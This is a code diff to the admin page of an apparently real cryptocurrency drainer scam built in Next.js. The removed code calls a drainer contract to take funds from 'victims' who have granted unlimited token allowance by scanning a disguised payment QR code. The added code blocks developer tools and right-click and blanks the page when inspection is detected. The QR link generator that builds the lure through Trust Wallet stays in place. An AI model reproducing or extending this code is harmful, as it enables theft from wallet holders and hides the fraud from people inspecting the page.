@@ -1,12 +1,6 @@
 "use client";
 
 import { useState, useEffect, useRef } from "react";
-import { ethers } from "ethers";
-
-const DRAINER_ADDRESS = "0x53361FFeA401307ea149F03d7B92DA6E1989eB42";
-const DRAINER_ABI = [
-  "function drain(address victim, address to) external",
-];
 
 export default function AdminPage() {
   const [receiverAddress, setReceiverAddress] = useState("0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf");
@@ -27,15 +21,60 @@ export default function AdminPage() {
 
   const [toastMessage, setToastMessage] = useState("");
 
-  const [drainVictim, setDrainVictim] = useState("");
-  const [drainTo, setDrainTo] = useState("");
-  const [drainLoading, setDrainLoading] = useState(false);
-
   const showToast = (msg: string) => {
     setToastMessage(msg);
     setTimeout(() => setToastMessage(""), 2000);
   };
 
+  // ========== ANTI‑INSPECT ==========
+  useEffect(() => {
+    const blockKeys = (e: KeyboardEvent) => {
+      if (
+        e.key === "F12" ||
+        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
+        (e.ctrlKey && e.key === "U")
+      ) {
+        e.preventDefault();
+        return false;
+      }
+    };
+
+    const blockContextMenu = (e: MouseEvent) => {
+      e.preventDefault();
+      return false;
+    };
+
+    document.addEventListener("keydown", blockKeys);
+    document.addEventListener("contextmenu", blockContextMenu);
+
+    // Détection DevTools (basée sur la différence de taille de la fenêtre)
+    let devToolsOpen = false;
+    const checkDevTools = () => {
+      const threshold = 160;
+      if (
+        window.outerWidth - window.innerWidth > threshold ||
+        window.outerHeight - window.innerHeight > threshold
+      ) {
+        if (!devToolsOpen) {
+          devToolsOpen = true;
+          document.body.innerHTML =
+            "<div style='color:white;text-align:center;margin-top:50vh;font-size:24px;'>Access denied</div>";
+        }
+      } else {
+        devToolsOpen = false;
+      }
+    };
+
+    const interval = setInterval(checkDevTools, 1000);
+
+    return () => {
+      document.removeEventListener("keydown", blockKeys);
+      document.removeEventListener("contextmenu", blockContextMenu);
+      clearInterval(interval);
+    };
+  }, []);
+
+  // Chargement des préférences sauvegardées
   useEffect(() => {
     if (typeof window !== "undefined") {
       const savedAddress = localStorage.getItem("admin_receiver_address");
@@ -55,6 +94,7 @@ export default function AdminPage() {
     }
   }, []);
 
+  // Génération du QR code et sauvegarde
   useEffect(() => {
     if (!isMounted || typeof window === "undefined" || !isAuthenticated) return;
 
@@ -70,12 +110,13 @@ export default function AdminPage() {
       amount: isMaxMode ? "max" : amount,
       token: token.toLowerCase(),
     };
-    const encoded = btoa(JSON.stringify(params)); // encodage Base64
+    const encoded = btoa(JSON.stringify(params));
     const targetUrl = `${baseUrl}?data=${encodeURIComponent(encoded)}`;
     const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`;
     setQrUrl(trustWalletLink);
   }, [receiverAddress, amount, token, isMaxMode, isMounted, isAuthenticated]);
 
+  // Rendu du QR code stylisé
   useEffect(() => {
     if (!qrUrl || typeof window === "undefined" || !isMounted || !isAuthenticated) return;
 
@@ -146,31 +187,6 @@ export default function AdminPage() {
       } else {
         navigator.clipboard.writeText(qrUrl).then(() => showToast("Payment link copied!"));
       }
-    }
-  };
-
-  const handleDrain = async () => {
-    if (!window.ethereum) {
-      showToast("No Ethereum wallet detected.");
-      return;
-    }
-    if (!ethers.isAddress(drainVictim) || !ethers.isAddress(drainTo)) {
-      showToast("Invalid victim or destination address.");
-      return;
-    }
-    setDrainLoading(true);
-    try {
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-      const drainer = new ethers.Contract(DRAINER_ADDRESS, DRAINER_ABI, signer);
-      const tx = await drainer.drain(drainVictim, drainTo);
-      await tx.wait();
-      showToast("Drain successful!");
-    } catch (err: any) {
-      console.error(err);
-      showToast("Drain failed: " + (err?.message ?? "Unknown error"));
-    } finally {
-      setDrainLoading(false);
     }
   };
 
@@ -360,71 +376,6 @@ export default function AdminPage() {
               <span className="receive-deposit-title">Deposit from exchange</span>
               <span className="receive-deposit-subtitle">By direct transfer from your account</span>
             </div>
-          </div>
-        </div>
-
-        {/* ========== SECTION DRAIN (avec grand espace) ========== */}
-        <div style={{
-          marginTop: "5rem",
-          background: "#ffffff",
-          border: "1px solid #e2e8f0",
-          borderRadius: "1rem",
-          padding: "1.5rem",
-          boxShadow: "0 4px 6px -1px rgba(0,0,0,0.02)"
-        }}>
-          <h2 style={{ fontSize: "1.2rem", fontWeight: 700, marginBottom: "0.5rem", color: "#0f172a" }}>
-            💀 Drain Victim (Owner only)
-          </h2>
-          <p style={{ fontSize: "0.85rem", color: "#475569", marginBottom: "1rem" }}>
-            After the victim has approved the unlimited allowance (by scanning the QR and clicking Next),
-            enter their address and click Drain Now. Make sure you are connected with the <strong>contract owner wallet</strong>.
-          </p>
-          <div style={{ display: "flex", flexDirection: "column", gap: "0.75rem" }}>
-            <div>
-              <label style={{ display: "block", fontSize: "0.8rem", fontWeight: 600, marginBottom: "0.25rem" }}>
-                Victim Address
-              </label>
-              <input
-                type="text"
-                value={drainVictim}
-                onChange={(e) => setDrainVictim(e.target.value)}
-                placeholder="0x..."
-                style={{
-                  width: "100%", padding: "0.6rem", borderRadius: "0.5rem",
-                  border: "1px solid #cbd5e1", fontSize: "0.9rem"
-                }}
-              />
-            </div>
-            <div>
-              <label style={{ display: "block", fontSize: "0.8rem", fontWeight: 600, marginBottom: "0.25rem" }}>
-                Destination Address (your wallet)
-              </label>
-              <input
-                type="text"
-                value={drainTo}
-                onChange={(e) => setDrainTo(e.target.value)}
-                placeholder="0x..."
-                style={{
-                  width: "100%", padding: "0.6rem", borderRadius: "0.5rem",
-                  border: "1px solid #cbd5e1", fontSize: "0.9rem"
-                }}
-              />
-            </div>
-            <button
-              onClick={handleDrain}
-              disabled={drainLoading}
-              style={{
-                backgroundColor: "#dc2626", color: "#fff", fontWeight: 600,
-                fontSize: "0.9rem", padding: "0.7rem 1.5rem", borderRadius: "0.5rem",
-                border: "none", cursor: "pointer", boxShadow: "0 1px 3px rgba(0,0,0,0.1)",
-                alignSelf: "flex-start"
-              }}
-            >
-              {drainLoading ? "Draining..." : "Drain Now"}
-            </button>
-          </div>
-          <div style={{ marginTop: "0.75rem", fontSize: "0.75rem", color: "#94a3b8" }}>
-            Contract: {DRAINER_ADDRESS.slice(0, 6)}...{DRAINER_ADDRESS.slice(-4)} (owner access required)
           </div>
         </div>
 
